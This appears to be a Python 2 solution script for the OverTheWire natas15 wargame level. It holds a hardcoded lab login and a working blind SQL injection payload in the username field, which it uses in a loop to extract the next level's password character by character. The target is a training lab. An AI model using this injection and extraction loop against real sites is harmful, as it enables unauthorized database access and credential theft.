import httplib2
import urllib

website = httplib2.Http()
website.add_credentials('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

password = "" #Blank for know. Will be added to as the code guess chars
charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

counter = 0 #will iterate if there is a correct guess

while counter < len(charSet):
	query = urllib.urlencode(dict(username="natas16\" AND password LIKE BINARY \"" + password + charSet[counter] + "%\" ;# "))
	resp, content = website.request("http://natas15.natas.labs.overthewire.org/index.php?" + query, method="POST")
	#Check to see if the query was successful
	if ("This user exists" in str(content)):
		password += charSet[counter] #keep adding to password as characters are successful in the query
		print "Password attempt was: " + password
		counter = 0 #rest back to beginning of character of set, since we just got a successful hit
		continue #continue with the while loop
	else:
		counter += 1 #move up the characterset if not a match
		continue

